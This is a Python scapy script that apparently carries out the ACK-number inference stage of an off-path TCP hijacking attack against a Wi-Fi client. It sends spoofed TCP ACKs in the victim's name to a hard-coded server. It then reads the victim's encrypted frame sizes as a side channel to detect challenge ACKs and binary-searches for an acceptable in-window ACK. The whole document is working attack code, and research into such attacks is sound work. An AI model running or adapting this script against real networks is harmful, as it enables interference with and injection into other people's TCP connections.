#!/usr/bin/python
from scapy.all import *
from copy import deepcopy
import time

IN_CHALLENGE_WINDOW = 1
OUT_CHALLENGE_WINDOW = 0

class Ack_Finder:

    def __init__(self, client_mac='c0:b8:83:0e:ad:85', client_ip='192.168.43.127', 
                 server_ip='124.70.155.59', client_port=-1, server_port=-1, seq_in_window=-1, 
                 send_if_name='wlan0', sniff_if_name=['wlan1'], seq_window_size=65535, repeat_num=4):
        self.client_mac = client_mac
        self.client_ip = client_ip
        self.server_ip = server_ip
        self.client_port = client_port
        self.server_port = server_port
        self.seq_in_window = seq_in_window

        self.send_if_name = send_if_name
        self.sniff_if_name = sniff_if_name
        self.seq_window_size = seq_window_size

        self.repeat_num = repeat_num
        self.ack_num = 0
        self.sack_ack_num = 0
        self.ack_check_start = -1
        self.ack_left_bound = -1
        self.keep_nat_time = -1
        
        self.send_num_ch_ack = 0
        self.send_byte_ch_ack = 0
        self.cost_time_ch_ack = 0
        self.send_rate_ch_ack = 0

        self.send_num_ac_ack = 0
        self.send_byte_ac_ack = 0
        self.cost_time_ac_ack = 0
        self.send_rate_ac_ack = 0

        self.send_num_seq = 0
        self.send_byte_seq = 0
        self.cost_time_seq = 0
        self.send_rate_seq = 0

        self.send_num = 0
        self.send_byte = 0
        self.ack_in_window = -1
        self.seq_num = -1

        self.frame_num = 0
        self.AMSDU_num = 0
        self.valid_frame_num = 0

    def handle_packets(self, packet_list):
        self.ack_num = 0
        self.sack_ack_num = 0

        for pkt in packet_list:
            if pkt[Dot11].addr1==self.client_mac:
                self.frame_num += 1
                if pkt[Dot11].type==2 and pkt[Dot11].subtype==8:
                    ##### This is a qos frame #####
                    if pkt.haslayer("Dot11CCMP"):
                        if pkt.haslayer("Dot11QoS"):
                            if pkt[Dot11QoS].A_MSDU_Present == 1:
                                self.AMSDU_num += 1

                        if len(pkt[Dot11CCMP].data) == 68:
                            self.ack_num += 1
                            self.valid_frame_num += 1
                            break

    def check_ack_list(self, ack_list):
        send_list = []
        for ack in ack_list:
            for i in range(self.repeat_num):
                send_list.append(IP(src=self.client_ip, dst=self.server_ip) /
                                TCP(sport=self.client_port, dport=self.server_port, seq=self.seq_in_window, 
                                ack=ack, flags='A'))
            
        self.send_num += len(send_list)
        for pkt in send_list:
            self.send_byte += len(pkt)
        
        pkts = sniff(filter="ether host "+self.client_mac, iface=self.sniff_if_name, count=0, 
                      timeout=0.15, started_callback=lambda: send(send_list, iface=self.send_if_name, verbose=False))

        self.handle_packets(pkts)

    def check_ack(self, ac):
        ack_challenge_num = 0
        check_line = 2

        for i in range(5):
            self.check_ack_list([ac])
            if self.ack_num > 0:  
                ack_challenge_num += 1
                if ack_challenge_num >= check_line:
                    return IN_CHALLENGE_WINDOW

        return OUT_CHALLENGE_WINDOW

    def find_challenge_ack(self):
        print("++++++++++ Try to find the challenge ACK ++++++++++")

        ack_list = [0]
        for i in range(0, 3):
            ack_list.append(ack_list[-1] + (1 << 30))
        
        while True:
            for ack in ack_list:
                location = self.check_ack(ack)

                if location == IN_CHALLENGE_WINDOW:
                    self.ack_check_start = ack
                    print('[+] Find a ack in challenge ack window: %d' %self.ack_check_start)
                    return

    def find_ack_in_window(self):
        print("++++++++++ Try to find the acceptable ACK ++++++++++")

        rb = self.ack_check_start
        lb = rb - (1 << 31)
        ans = -1
        while rb >= lb:
            mid = int((rb + lb) / 2)
            ack_mid = mid if mid >= 0 else mid + (1 << 32)
            
            location = self.check_ack(ack_mid)
            if location == IN_CHALLENGE_WINDOW:
                ans = mid
                rb = mid - 1
            else:
                lb = mid + 1
        
        self.ack_left_bound = ans if ans >= 0 else ans + (1 << 32)
        self.ack_in_window = (self.ack_left_bound + (1 << 31)) & ((1 << 32) - 1) 
        print('[+] Find the ack left bound is %d, the ack in window is %d' %(self.ack_left_bound, self.ack_in_window))

    def run(self):
        time_start = time.time()
        self.stop = False
        self.ack_in_window = -1
        self.seq_num = -1

        self.find_challenge_ack()
        self.send_num_ch_ack = self.send_num
        self.send_num = 0
        self.send_byte_ch_ack = self.send_byte
        self.send_byte = 0
        time_ch_ack = time.time()
        self.cost_time_ch_ack = time_ch_ack - time_start
        self.send_rate_ch_ack = self.send_byte_ch_ack / self.cost_time_ch_ack

        self.find_ack_in_window()
        self.send_num_ac_ack = self.send_num
        self.send_num = 0
        self.send_byte_ac_ack = self.send_byte
        self.send_byte = 0
        time_ac_ack = time.time()
        self.cost_time_ac_ack = time_ac_ack - time_ch_ack
        self.send_rate_ac_ack = self.send_byte_ac_ack / self.cost_time_ac_ack

        cost_time = time_ac_ack - time_start

        print('Find the ack in window: %d' %self.ack_in_window)
        print('Find the seq num: %d' %self.seq_num)
        print('Send Packets: %d' %(self.send_num_ch_ack+self.send_num_ac_ack+self.send_num_seq))
        print('Send Bytes: %d (Bytes)' %(self.send_byte_ch_ack+self.send_byte_ac_ack+self.send_byte_seq))
        print('Cost Time: %f (s)' %(cost_time))